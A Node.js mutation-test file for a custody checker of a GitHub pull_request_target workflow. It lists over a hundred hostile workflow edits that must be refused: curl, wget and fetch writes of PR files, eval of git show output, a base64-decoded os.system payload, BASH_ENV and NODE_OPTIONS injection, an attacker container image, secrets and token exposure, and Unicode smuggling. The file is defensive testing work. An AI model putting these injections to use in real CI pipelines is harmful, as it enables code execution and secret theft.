#!/usr/bin/env node
// Mutation tests for verify-supply-verifier-pin-guard-custody.mjs, the custody
// check of the pull_request_target pin-guard workflow. The real workflow must
// pass and every mutation below must be refused. Each mutation would let a PR
// run its own code, keep a token, widen permissions, use secrets, switch to a
// trigger that runs the PR's copy of the checker, or let the check pass
// without running. Cases tagged [lint] must also be refused by the static
// rules alone (lintPinGuardWorkflow), so an edit of EXPECTED_LINES that
// allowlists them still fails.
import assert from 'node:assert/strict';
import { readFile } from 'node:fs/promises';
import { PIN_GUARD_WORKFLOW_PATH, lintPinGuardStructure, lintPinGuardWorkflow, parseStrictYaml, significantLines, verifyPinGuardWorkflow } from './verify-supply-verifier-pin-guard-custody.mjs';

const workflow = await readFile(PIN_GUARD_WORKFLOW_PATH, 'utf8');
assert.doesNotThrow(() => verifyPinGuardWorkflow(workflow), 'the real workflow must pass');
assert.doesNotThrow(() => verifyPinGuardWorkflow(`# extra comment\n\n${workflow}\n# trailing\n`), 'comments and blank lines are free');
assert.doesNotThrow(() => lintPinGuardWorkflow(significantLines(workflow)), 'the real workflow must pass the static rules');
assert.doesNotThrow(() => lintPinGuardStructure(workflow), 'the real workflow must pass the structural allowlist');
assert.doesNotThrow(() => lintPinGuardStructure(`# extra comment\n\n${workflow}\n# trailing\n`), 'comments and blank lines are free for the structural allowlist too');

const replaceOnce = (text, from, to) => { assert.ok(text.includes(from), `mutation anchor missing: ${from}`); return text.replace(from, to); };
const at = (anchor, insert) => replaceOnce(workflow, anchor, `${insert}${anchor}`);
const after = (anchor, insert) => replaceOnce(workflow, anchor, `${anchor}${insert}`);
const SETUP = '      - name: Set up Node.js\n';
const CHECK_STEP = '      - name: Check the PR head pin against the merge base with main (data only)\n';
const RUN_START = '          set -euo pipefail\n';
const BEFORE_CHECK = '          if [ ! -f .github/scripts/verify-supply-verifier-pin-guard.mjs ]; then\n';
const CHECKER = 'node .github/scripts/verify-supply-verifier-pin-guard.mjs --merge-base origin/main --head "$PR_HEAD_SHA"';
const NPM = '        run: npm ci --ignore-scripts --no-audit --no-fund\n';
const AFTER_TIMEOUT = '    timeout-minutes: 10\n';
const AFTER_STEPS_END = '          node .github/scripts/verify-supply-verifier-pin-guard.mjs --merge-base origin/main --head "$PR_HEAD_SHA" --event "$GITHUB_EVENT_PATH" --toolchain l1/node_modules --scratch "$RUNNER_TEMP/pin-guard"\n';
const HEAD_CHECKOUT = '      - name: Checkout PR head\n        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1\n        with:\n          ref: ${{ github.event.pull_request.head.sha }}\n          path: pr\n';

const mutations = {
  // Architect's required refusals.
  '[lint] npm ci in the run script': after(RUN_START, '          npm ci\n'),
  '[lint] npm install of the PR head after the fetch': at(BEFORE_CHECK, '          npm --prefix pr/l1 install\n'),
  '[lint] npm ci without --ignore-scripts': replaceOnce(workflow, NPM, '        run: npm ci --no-audit --no-fund\n'),
  '[lint] npx in the run script': at(BEFORE_CHECK, '          npx tsc -v\n'),
  '[lint] toolchain installed after the PR head is fetched': replaceOnce(replaceOnce(workflow, `      - name: Install main's l1 TypeScript toolchain (main's lockfile, no install scripts)\n        working-directory: l1\n${NPM}`, ''), '          git cat-file -e', `          (cd l1 && npm ci --ignore-scripts --no-audit --no-fund)\n          git cat-file -e`),
  '[lint] run: references a pr/ script': at(BEFORE_CHECK, '          node pr/tools/supply-verifier/pin-hash.mjs --print\n'),
  '[lint] run: references ./pr/ script': at(BEFORE_CHECK, '          bash ./pr/build.sh\n'),
  '[lint] checker run from a pr/ copy': replaceOnce(workflow, CHECKER, 'node pr/.github/scripts/verify-supply-verifier-pin-guard.mjs --merge-base origin/main --head "$PR_HEAD_SHA"'),
  '[lint] head checkout into pr/ without persist-credentials': at(SETUP, HEAD_CHECKOUT),
  '[lint] head checkout into pr/ with persist-credentials false': at(SETUP, `${HEAD_CHECKOUT}          persist-credentials: false\n`),
  '[lint] persist-credentials missing on the main checkout': replaceOnce(workflow, '          persist-credentials: false\n', ''),
  '[lint] persist-credentials true': replaceOnce(workflow, 'persist-credentials: false', 'persist-credentials: true'),
  '[lint] pull_request instead of pull_request_target': replaceOnce(workflow, '  pull_request_target:\n', '  pull_request:\n'),
  '[lint] pull_request added next to pull_request_target': replaceOnce(workflow, 'on:\n', 'on:\n  pull_request:\n'),
  '[lint] inline trigger list': replaceOnce(workflow, 'on:\n', 'on: [pull_request]\nx:\n'),
  '[lint] top-level contents: write': replaceOnce(workflow, 'permissions:\n  contents: read', 'permissions:\n  contents: write'),
  '[lint] extra top-level permission pull-requests: read': replaceOnce(workflow, 'permissions:\n  contents: read\n', 'permissions:\n  contents: read\n  pull-requests: read\n'),
  '[lint] permissions: write-all': replaceOnce(workflow, 'permissions:\n  contents: read\n', 'permissions: write-all\n'),
  '[lint] job-level permissions': replaceOnce(workflow, '    runs-on: ubuntu-latest\n', '    permissions:\n      contents: write\n    runs-on: ubuntu-latest\n'),
  '[lint] secrets in env': replaceOnce(workflow, '          PR_NUMBER:', '          TOK: ${{ secrets.X }}\n          PR_NUMBER:'),
  '[lint] GITHUB_TOKEN in env': replaceOnce(workflow, '          PR_NUMBER:', '          GH_TOKEN: ${{ github.token }}\n          PR_NUMBER:'),
  '[lint] token: on checkout': after('          fetch-depth: 0\n', '          token: ${{ secrets.PAT }}\n'),
  // No fallback to the PR's lockfile (Patron ruling: main's lockfile only).
  '[lint] PR lockfile copied over main\'s before the checker': at(BEFORE_CHECK, '          git show "$PR_HEAD_SHA":l1/package-lock.json > l1/package-lock.json\n'),
  '[lint] PR lockfile fallback install when the checker fails': replaceOnce(workflow, '--scratch "$RUNNER_TEMP/pin-guard"\n', '--scratch "$RUNNER_TEMP/pin-guard" || { git show "$PR_HEAD_SHA":l1/package-lock.json > l1/package-lock.json; (cd l1 && npm ci --ignore-scripts); }\n'),
  '[lint] PR lockfile fallback in the install step': replaceOnce(workflow, NPM, '        run: npm ci --ignore-scripts --no-audit --no-fund || npm install --ignore-scripts\n'),
  '[lint] PR lockfile fetched with git cat-file and installed': at(BEFORE_CHECK, '          git cat-file blob "$PR_HEAD_SHA":l1/package-lock.json | tee l1/package-lock.json\n'),
  '[lint] PR package.json restored into main\'s l1/': at(BEFORE_CHECK, '          git restore --source="$PR_HEAD_SHA" -- l1/package.json l1/package-lock.json\n'),
  '[lint] install from the PR lockfile via --prefix': replaceOnce(workflow, NPM, '        run: npm ci --ignore-scripts --no-audit --no-fund --prefix ../pr/l1\n'),
  // Other unsafe shapes.
  '[lint] checkout of the head via ref:': after('          fetch-depth: 0\n', '          ref: ${{ github.event.pull_request.head.sha }}\n'),
  '[lint] head SHA interpolated into the run script': replaceOnce(workflow, CHECKER, 'node .github/scripts/verify-supply-verifier-pin-guard.mjs --merge-base origin/main --head ${{ github.event.pull_request.head.sha }}'),
  '[lint] title injection in the run script': after(RUN_START, '          echo "${{ github.event.pull_request.title }}"\n'),
  '[lint] mutable setup-node tag': replaceOnce(workflow, 'setup-node@949feb2413d6458794dcd2491c4babbbce0c15c1', 'setup-node@v4'),
  '[lint] mutable checkout tag': replaceOnce(workflow, 'checkout@3d3c42e5aac5ba805825da76410c181273ba90b1', 'checkout@v4'),
  '[lint] local action': at(SETUP, '      - uses: ./.github/actions/x\n'),
  '[lint] npm cache on setup-node': after('          node-version-file: tools/supply-verifier/.nvmrc\n', '          cache: npm\n'),
  '[lint] step allowed to fail': replaceOnce(workflow, '        shell: bash\n', '        shell: bash\n        continue-on-error: true\n'),
  '[lint] step made conditional': replaceOnce(workflow, '        shell: bash\n', '        shell: bash\n        if: false\n'),
  '[lint] missing checker passes again': replaceOnce(workflow, '            exit 1\n', '            exit 0\n'),
  '[lint] checker run without the toolchain (rebuild skipped)': replaceOnce(workflow, ' --toolchain l1/node_modules --scratch "$RUNNER_TEMP/pin-guard"', ''),
  'checker failure ignored with || true': replaceOnce(workflow, '--scratch "$RUNNER_TEMP/pin-guard"\n', '--scratch "$RUNNER_TEMP/pin-guard" || true\n'),
  'set -e dropped': replaceOnce(workflow, RUN_START, '          set -uo pipefail\n'),
  'git archive of head scripts': at(BEFORE_CHECK, '          git archive "$PR_HEAD_SHA" tools | tar -x\n'),
  'git checkout of the head': after(RUN_START, '          git checkout "$PR_HEAD_SHA"\n'),
  'eval of git show output': at(BEFORE_CHECK, '          eval "$(git show "$PR_HEAD_SHA":x.sh)"\n'),
  'node runs a head script read with git show': replaceOnce(workflow, CHECKER, 'git show "$PR_HEAD_SHA":tools/supply-verifier/pin-hash.mjs | node --input-type=module'),
  'base branch other than main': replaceOnce(workflow, '    branches: [main]\n', '    branches: [main, "test/**"]\n'),
  'branch filter removed': replaceOnce(workflow, '    branches: [main]\n', ''),
  'label events removed': replaceOnce(workflow, 'types: [opened, synchronize, reopened, labeled, unlabeled]', 'types: [opened, synchronize, reopened]'),
  'workflow_dispatch trigger added': after('    types: [opened, synchronize, reopened, labeled, unlabeled]\n', '  workflow_dispatch:\n'),
  'second step before the check': at(CHECK_STEP, '      - name: hi\n        run: echo hi\n'),
  'CR line endings': workflow.replace(/\n/g, '\r\n'),
  'TAB indentation smuggled in': replaceOnce(workflow, '          set -euo pipefail', '\tset -euo pipefail'),
  'flow-style step added': at(SETUP, '      - {name: x, run: "bash -c \\"$(git show HEAD:x)\\""}\n'),
  // Security's PoCs on c075f633 (poc-disk-write-bypass.mjs, poc-custody-r5-c075.mjs),
  // committed verbatim. Each must be refused; the structural allowlist alone
  // must refuse every one of them (see the loop below).
  '[poc-disk] heredoc cat <<EOF > lockfile (has >)': after(RUN_START, '          cat <<EOF > l1/package-lock.json\n{}\nEOF\n'),
  '[poc-disk] heredoc cat <<EOF | python write (NO >)': after(RUN_START, '          python3 - <<PY\nopen("l1/package-lock.json","wb").write(b"{}")\nPY\n'),
  '[poc-disk] tee of git show': after(RUN_START, '          git show "$PR_HEAD_SHA":l1/package-lock.json | tee l1/package-lock.json\n'),
  '[poc-disk] git show piped to a file with >': after(RUN_START, '          git show "$PR_HEAD_SHA":l1/package-lock.json > l1/package-lock.json\n'),
  '[poc-disk] git checkout of the PR ref': after(RUN_START, '          git checkout "$PR_HEAD_SHA"\n'),
  '[poc-disk] gh cli: gh pr checkout': after(RUN_START, '          gh pr checkout "$PR_NUMBER"\n'),
  '[poc-disk] gh cli: gh api contents': after(RUN_START, '          gh api repos/zyron249/-zyronchain/contents/l1/package-lock.json\n'),
  '[poc-disk] curl raw.githubusercontent into a file': after(RUN_START, '          curl -o l1/package-lock.json https://raw.githubusercontent.com/zyron249/-zyronchain/"$PR_HEAD_SHA"/l1/package-lock.json\n'),
  '[poc-disk] wget raw.githubusercontent': after(RUN_START, '          wget -O l1/package-lock.json https://raw.githubusercontent.com/x/"$PR_HEAD_SHA"/l1/package-lock.json\n'),
  '[poc-disk] actions/github-script uses step': at(SETUP, '      - uses: actions/github-script@v7\n        with:\n          script: require("fs").writeFileSync("x","y")\n'),
  '[poc-disk] git cat-file | python3 write (no >, no show/tee)': after(RUN_START, '          git cat-file blob "$PR_HEAD_SHA:l1/package-lock.json" | python3 -c "import sys; open(\'l1/package-lock.json\',\'wb\').write(sys.stdin.buffer.read())"\n'),
  '[poc-disk] git cat-file | node write': after(RUN_START, '          git cat-file blob "$PR_HEAD_SHA:l1/package-lock.json" | node -e "const fs=require(\'fs\');fs.writeFileSync(\'l1/package-lock.json\',fs.readFileSync(0))"\n'),
  '[poc-disk] git -C . show | python3 write (git flags before subcmd)': after(RUN_START, '          git -C . show "$PR_HEAD_SHA:l1/package-lock.json" | python3 -c "import sys; open(\'l1/package-lock.json\',\'wb\').write(sys.stdin.buffer.read())"\n'),
  '[poc-disk] git --git-dir=.git show | python3 write': after(RUN_START, '          git --git-dir=.git show "$PR_HEAD_SHA:l1/package-lock.json" | python3 -c "import sys; open(\'l1/package-lock.json\',\'wb\').write(sys.stdin.buffer.read())"\n'),
  '[poc-disk] wrapper function then g show': after(RUN_START, '          g() { git "$@"; }; g show "$PR_HEAD_SHA:l1/package-lock.json" | python3 -c "import sys; open(\'l1/package-lock.json\',\'wb\').write(sys.stdin.buffer.read())"\n'),
  '[poc-disk] eval "$EVIL" only in run (git show lives in env)': replaceOnce(
    replaceOnce(workflow, '          PR_HEAD_SHA: ${{ github.event.pull_request.head.sha }}\n', '          PR_HEAD_SHA: ${{ github.event.pull_request.head.sha }}\n          EVIL: git show "$PR_HEAD_SHA":l1/package-lock.json | python3 -c "import sys; open(\'l1/package-lock.json\',\'wb\').write(sys.stdin.buffer.read())"\n'),
    RUN_START,
    RUN_START + '          eval "$EVIL"\n',
  ),
  '[poc-disk] python urllib instead of curl (in run: |)': after(RUN_START, '          python3 -c "import urllib.request; urllib.request.urlretrieve(\'https://raw.githubusercontent.com/zyron249/-zyronchain/%s/l1/package-lock.json\' % __import__(\'os\').environ[\'PR_HEAD_SHA\'], \'l1/package-lock.json\')"\n'),
  '[poc-disk] node fetch instead of curl': after(RUN_START, '          node -e "fetch(\'https://raw.githubusercontent.com/zyron249/-zyronchain/\'+process.env.PR_HEAD_SHA+\'/l1/package-lock.json\').then(r=>r.arrayBuffer()).then(b=>require(\'fs\').writeFileSync(\'l1/package-lock.json\',Buffer.from(b)))"\n'),
  '[poc-disk] base64-decoded writer, no blocked tokens': after(RUN_START, '          python3 -c "import base64,os; os.system(base64.b64decode(\'ZWNobyBoaWpqYWNr\').decode())"\n'),
  '[poc-disk] single-line run: curl BEFORE run: | block': at(CHECK_STEP, '      - name: x\n        run: curl -o l1/package-lock.json https://raw.githubusercontent.com/zyron249/-zyronchain/${{ github.event.pull_request.head.sha }}/l1/package-lock.json\n'),
  '[poc-disk] single-line run: git show > file BEFORE run: |': at(CHECK_STEP, '      - name: x\n        run: git show ${{ github.event.pull_request.head.sha }}:l1/package-lock.json > l1/package-lock.json\n'),
  '[poc-disk] flow-style run curl before setup': at(SETUP, '      - {name: x, run: "curl -o l1/package-lock.json https://example.invalid/lock"}\n'),
  '[poc-disk] dd of= (blocked token dd)': after(RUN_START, '          git cat-file blob "$PR_HEAD_SHA:l1/package-lock.json" | dd of=l1/package-lock.json\n'),
  '[poc-disk] install -m (blocked token install)': after(RUN_START, '          git cat-file blob "$PR_HEAD_SHA:l1/package-lock.json" | install -m 0644 /dev/stdin l1/package-lock.json\n'),
  '[poc-disk] process substitution source <(git cat-file)': after(RUN_START, '          python3 -c "import sys; open(\'l1/package-lock.json\',\'wb\').write(sys.stdin.buffer.read())" < <(git cat-file blob "$PR_HEAD_SHA:l1/package-lock.json")\n'),
  '[poc-disk] sponge (moreutils) from git cat-file': after(RUN_START, '          git cat-file blob "$PR_HEAD_SHA:l1/package-lock.json" | sponge l1/package-lock.json\n'),
  '[poc-disk] rsync from a tmp write via python only': after(RUN_START, '          python3 -c "open(\'/tmp/x\',\'w\').write(\'z\')" && rsync /tmp/x l1/package-lock.json\n'),
  '[poc-disk] git unpack-file (not in denylist)': after(RUN_START, '          git unpack-file "$PR_HEAD_SHA:l1/package-lock.json"\n'),
  '[poc-disk] git sparse-checkout add (not in denylist)': after(RUN_START, '          git sparse-checkout add l1/package-lock.json\n'),
  '[poc-disk] busybox wget (token wget still present?)': after(RUN_START, '          busybox wget -O l1/package-lock.json https://example.invalid\n'),
  '[poc-disk] CURL uppercase (case-sensitive denylist)': after(RUN_START, '          CURL -o l1/package-lock.json https://example.invalid\n'),
  '[poc-disk] job-level env BASH_ENV (still structural)': after(AFTER_TIMEOUT, '    env:\n      BASH_ENV: /tmp/evil.sh\n'),
  '[poc-disk] job-level container (still structural)': after(AFTER_TIMEOUT, '    container:\n      image: ghcr.io/attacker/runner:latest\n'),
  '[poc-r5] job-level env BASH_ENV after timeout': after(AFTER_TIMEOUT, '    env:\n      BASH_ENV: /tmp/evil.sh\n'),
  '[poc-r5] job-level env NODE_OPTIONS after timeout': after(AFTER_TIMEOUT, '    env:\n      NODE_OPTIONS: --require=/tmp/evil.cjs\n'),
  '[poc-r5] job-level container (attacker image)': after(AFTER_TIMEOUT, '    container:\n      image: ghcr.io/attacker/runner:latest\n'),
  '[poc-r5] job-level services with host mount': after(AFTER_TIMEOUT, '    services:\n      x:\n        image: alpine\n        options: -v /:/host\n'),
  '[poc-r5] job-level if: false (skipped = passing)': after(AFTER_TIMEOUT, '    if: false\n'),
  '[poc-r5] job-level continue-on-error': after(AFTER_TIMEOUT, '    continue-on-error: true\n'),
  '[poc-r5] job-level defaults.run.shell rcfile': after(AFTER_TIMEOUT, '    defaults:\n      run:\n        shell: bash --rcfile /tmp/evil.sh {0}\n'),
  '[poc-r5] second steps: key after first job (YAML last-wins)': after(AFTER_STEPS_END, '    steps:\n      - name: evil\n        run: echo skipped-real-steps\n'),
  '[poc-r5] workflow-level env AFTER jobs (BASH_ENV)': workflow + 'env:\n  BASH_ENV: ./evil.sh\n',
  '[poc-r5] workflow-level defaults AFTER jobs': workflow + 'defaults:\n  run:\n    shell: bash --rcfile ./evil.sh {0}\n',
  '[poc-r5] duplicate job key later (last-wins)': workflow + '  supply-verifier-pin-guard:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo no-check\n',
  '[poc-r5] job renamed (name: keep display)': replaceOnce(workflow, '  supply-verifier-pin-guard:\n    runs-on:', '  supply-verifier-pin-guard-x:\n    name: supply-verifier-pin-guard\n    runs-on:'),
  '[poc-r5] document separator + 2nd doc': workflow + '---\njobs: {}\n',
  '[poc-r5] YAML anchor alias merge key on job': after(AFTER_TIMEOUT, '    <<: *evil\n'),
  '[poc-r5] flow-style extra step before setup': at('      - name: Set up Node.js\n', '      - {name: x, run: "id"}\n'),
  '[poc-r5] Unicode NBSP trailing on name line': replaceOnce(workflow, 'name: Supply Verifier Pin Guard (main checker)', 'name: Supply Verifier Pin Guard (main checker)\u00a0'),
  '[poc-r5] Unicode zero-width space in run npm line': replaceOnce(workflow, '        run: npm ci --ignore-scripts --no-audit --no-fund', '        run: npm ci --ignore-scripts --no-audit --no-fund\u200b'),
  '[poc-r5] RTL override in comment-looking line': after(AFTER_TIMEOUT, '    \u202erun: echo hijack\n'),
  '[poc-r5] fullwidth number sign not a YAML comment': after(AFTER_TIMEOUT, '    ＃ container: {image: evIl}\n'),
  '[poc-r5] git checkout of the head after fetch': after(RUN_START, '          git checkout "$PR_HEAD_SHA"\n'),
  '[poc-r5] git archive of head into workspace': after(RUN_START, '          git archive "$PR_HEAD_SHA" | tar -x\n'),
  '[poc-r5] eval of git show output': after(RUN_START, '          eval "$(git show "$PR_HEAD_SHA":evil.sh)"\n'),
  '[poc-r5] node runs a head script from git show': after(RUN_START, '          git show "$PR_HEAD_SHA":evil.mjs | node --input-type=module\n'),
  '[poc-r5] write GITHUB_ENV NODE_OPTIONS mid-script': after(RUN_START, '          echo NODE_OPTIONS=--require=/tmp/x >> "$GITHUB_ENV"\n'),
  '[poc-r5] shell: bash --rcfile': replaceOnce(workflow, '        shell: bash\n', '        shell: bash --rcfile /tmp/evil.sh\n'),
  '[poc-r5] runs-on self-hosted': replaceOnce(workflow, '    runs-on: ubuntu-latest\n', '    runs-on: self-hosted\n'),
  '[poc-r5] permissions read-all (top-level)': replaceOnce(workflow, 'permissions:\n  contents: read\n', 'permissions: read-all\n'),
  // Structural extras.
  'duplicate key inside a step (with:)': after('          fetch-depth: 0\n', '        with:\n          persist-credentials: true\n'),
  'duplicate env key in the check step': replaceOnce(workflow, '          PR_NUMBER: ${{ github.event.pull_request.number }}\n', '          PR_NUMBER: ${{ github.event.pull_request.number }}\n          PR_NUMBER: 1\n'),
  'step env BASH_ENV': replaceOnce(workflow, '          PR_NUMBER:', '          BASH_ENV: /tmp/evil.sh\n          PR_NUMBER:'),
  'step env NODE_OPTIONS': replaceOnce(workflow, '          PR_NUMBER:', '          NODE_OPTIONS: --require=/tmp/evil.cjs\n          PR_NUMBER:'),
  'env on the install step': replaceOnce(workflow, "        working-directory: l1\n", "        working-directory: l1\n        env:\n          npm_config_ignore_scripts: 'false'\n"),
  'single-line run with an extra command chained': replaceOnce(workflow, NPM, '        run: npm ci --ignore-scripts --no-audit --no-fund; id\n'),
  'folded block scalar for run': replaceOnce(workflow, '        run: |\n', '        run: >\n'),
  'keep-trailing block scalar for run': replaceOnce(workflow, '        run: |\n', '        run: |+\n'),
  'tagged scalar': replaceOnce(workflow, '    runs-on: ubuntu-latest\n', '    runs-on: !!str ubuntu-latest\n'),
  'quoted key': replaceOnce(workflow, '    runs-on: ubuntu-latest\n', '    "runs-on": ubuntu-latest\n'),
  'explicit key indicator': replaceOnce(workflow, '    runs-on: ubuntu-latest\n', '    ? runs-on\n    : ubuntu-latest\n'),
  'escape sequence in a double-quoted scalar': replaceOnce(workflow, '    runs-on: ubuntu-latest\n', '    runs-on: "ubuntu\\x2dlatest"\n'),
  'odd indentation': replaceOnce(workflow, '    runs-on: ubuntu-latest\n', '     runs-on: ubuntu-latest\n'),
  'fifth step appended after the check': workflow + '      - name: after\n        run: echo done\n',
  'steps reordered (install before setup-node)': replaceOnce(workflow, "      - name: Set up Node.js\n        uses: actions/setup-node@949feb2413d6458794dcd2491c4babbbce0c15c1 # v7.1.0\n        with:\n          node-version-file: tools/supply-verifier/.nvmrc\n      - name: Install main's l1 TypeScript toolchain (main's lockfile, no install scripts)\n        working-directory: l1\n        run: npm ci --ignore-scripts --no-audit --no-fund\n", "      - name: Install main's l1 TypeScript toolchain (main's lockfile, no install scripts)\n        working-directory: l1\n        run: npm ci --ignore-scripts --no-audit --no-fund\n      - name: Set up Node.js\n        uses: actions/setup-node@949feb2413d6458794dcd2491c4babbbce0c15c1 # v7.1.0\n        with:\n          node-version-file: tools/supply-verifier/.nvmrc\n"),
  'job strategy matrix': after(AFTER_TIMEOUT, '    strategy:\n      matrix:\n        x: [a]\n'),
  'job environment (secrets scope)': after(AFTER_TIMEOUT, '    environment: production\n'),
  'job outputs': after(AFTER_TIMEOUT, '    outputs:\n      x: y\n'),
  'workflow-level permissions moved after jobs': replaceOnce(workflow, 'permissions:\n  contents: read\n', '') + 'permissions:\n  contents: read\n',
};

// For these, the structural allowlist must refuse for the stated reason (not
// only because a later rule happens to differ).
const ENV_REASON = /env [A-Za-z_]+ is (?:an injection vector|not on the allowlist)/;
const JOB_KEYS = /jobs\.supply-verifier-pin-guard \(no container, services, defaults, env, if, permissions, strategy or other job keys\) keys must be exactly/;
const TOP_KEYS = /top level keys must be exactly \[name, on, permissions, concurrency, jobs\]/;
const DUPLICATE = /duplicate key/;
const RUN_CMD = /run command not on the allowlist/;
const ASCII = /is not allowed \(ASCII only/;
const STRUCTURAL_REASONS = {
  'step env BASH_ENV': ENV_REASON,
  'step env NODE_OPTIONS': ENV_REASON,
  '[lint] secrets in env': ENV_REASON,
  '[lint] GITHUB_TOKEN in env': ENV_REASON,
  '[poc-disk] eval "$EVIL" only in run (git show lives in env)': ENV_REASON,
  '[poc-r5] job-level env BASH_ENV after timeout': JOB_KEYS,
  '[poc-r5] job-level env NODE_OPTIONS after timeout': JOB_KEYS,
  '[poc-disk] job-level env BASH_ENV (still structural)': JOB_KEYS,
  '[poc-r5] job-level container (attacker image)': JOB_KEYS,
  '[poc-r5] job-level services with host mount': JOB_KEYS,
  '[poc-r5] job-level defaults.run.shell rcfile': JOB_KEYS,
  'job strategy matrix': JOB_KEYS,
  'job environment (secrets scope)': JOB_KEYS,
  '[poc-r5] workflow-level env AFTER jobs (BASH_ENV)': TOP_KEYS,
  '[poc-r5] workflow-level defaults AFTER jobs': TOP_KEYS,
  'workflow-level permissions moved after jobs': TOP_KEYS,
  '[poc-r5] second steps: key after first job (YAML last-wins)': DUPLICATE,
  '[poc-r5] duplicate job key later (last-wins)': DUPLICATE,
  'duplicate key inside a step (with:)': DUPLICATE,
  'duplicate env key in the check step': DUPLICATE,
  '[poc-disk] git cat-file | python3 write (no >, no show/tee)': RUN_CMD,
  '[poc-disk] git -C . show | python3 write (git flags before subcmd)': RUN_CMD,
  '[poc-disk] gh cli: gh pr checkout': RUN_CMD,
  '[poc-disk] python urllib instead of curl (in run: |)': RUN_CMD,
  '[poc-disk] wrapper function then g show': RUN_CMD,
  '[poc-disk] CURL uppercase (case-sensitive denylist)': RUN_CMD,
  'single-line run with an extra command chained': RUN_CMD,
  '[poc-r5] Unicode NBSP trailing on name line': ASCII,
  '[poc-r5] RTL override in comment-looking line': ASCII,
  '[poc-r5] Unicode zero-width space in run npm line': ASCII,
  '[poc-r5] fullwidth number sign not a YAML comment': ASCII,
};
for (const name of Object.keys(STRUCTURAL_REASONS)) assert.ok(Object.hasOwn(mutations, name), `reason given for an unknown mutation: ${name}`);
let lintOnly = 0;
let structural = 0;
for (const [name, mutated] of Object.entries(mutations)) {
  assert.notEqual(mutated, workflow, `${name}: the mutation changed nothing`);
  assert.throws(() => verifyPinGuardWorkflow(mutated), /supply-verifier pin guard workflow/, `${name} must be refused`);
  if (name.startsWith('[lint]')) {
    assert.throws(() => lintPinGuardWorkflow(significantLines(mutated)), /supply-verifier pin guard workflow/, `${name} must be refused by the static rules alone`);
    lintOnly += 1;
  }
  // Every mutation must also be refused by the structural allowlist alone, so
  // a same-PR edit of EXPECTED_LINES and of the regex rules still fails.
  assert.throws(() => lintPinGuardStructure(mutated), STRUCTURAL_REASONS[name] ?? /supply-verifier pin guard workflow/, `${name} must be refused by the structural allowlist alone${STRUCTURAL_REASONS[name] ? ` (${STRUCTURAL_REASONS[name]})` : ''}`);
  structural += 1;
}
// The strict parser itself: refuses what a lenient YAML parser would accept.
const parserCases = {
  'duplicate top-level key': 'a: 1\na: 2\n',
  'duplicate nested key': 'a:\n  b: 1\n  b: 2\n',
  'anchor': 'a: &x 1\n',
  'alias': 'a: *x\n',
  'merge key': 'a:\n  <<: *x\n',
  'second document': 'a: 1\n---\nb: 2\n',
  'document end marker': 'a: 1\n...\n',
  'directive': '%YAML 1.2\na: 1\n',
  'flow mapping': 'a: {b: 1}\n',
  'NBSP': 'a: b\u00a0\n',
  'zero-width space': 'a: b\u200b\n',
  'TAB': 'a:\tb\n',
  'CR': 'a: b\r\n',
  'empty value': 'a:\nb: 1\n',
  'scalar sequence item': 'a:\n  - b\n',
};
for (const [why, text] of Object.entries(parserCases)) assert.throws(() => parseStrictYaml(text), /supply-verifier pin guard workflow: YAML/, `parser must refuse: ${why}`);
console.log(`supply-verifier pin guard custody mutations: ${Object.keys(mutations).length} refused (${lintOnly} also by the static rules alone, ${structural} also by the structural allowlist alone); strict parser: ${Object.keys(parserCases).length} refused`);
